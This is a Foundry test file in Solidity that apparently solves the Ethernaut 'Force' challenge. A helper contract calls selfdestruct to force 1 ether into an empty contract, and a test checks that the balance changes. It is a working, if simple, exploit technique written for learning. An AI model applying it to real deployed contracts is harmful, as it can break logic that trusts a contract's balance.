// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {console, Test} from "forge-std/Test.sol";

contract Force {
    // empty contract, intentionally
}

contract ForceHack {
    constructor(address payable _target) public payable {
        selfdestruct(_target);  // forcibly send ETH
    }
}

contract ForceTest is Test {
    Force public force;
    address payable forceAddress;

    function setUp() public {
        force = new Force();
        forceAddress = payable(address(force));
    }

    function testExploitForce() public {
        // Confirm the contract initially has no balance
        assertEq(address(force).balance, 0, "Initial balance should be 0");
        assertEq(forceAddress.balance, 0, "Initial balance should be 0");
        console.log("Verified Initial balance of force contract: ", address(force).balance);

        // Deploy the hack contract with some ETH, targeting the Force contract
        new ForceHack{value: 1 ether}(forceAddress);

        // Now the Force contract should have received ETH
        assertEq(forceAddress.balance, 1 ether, "Target should have received 1 ether");
        console.log("Verified empty Force contract has now received ether", address(force).balance);
    }
}
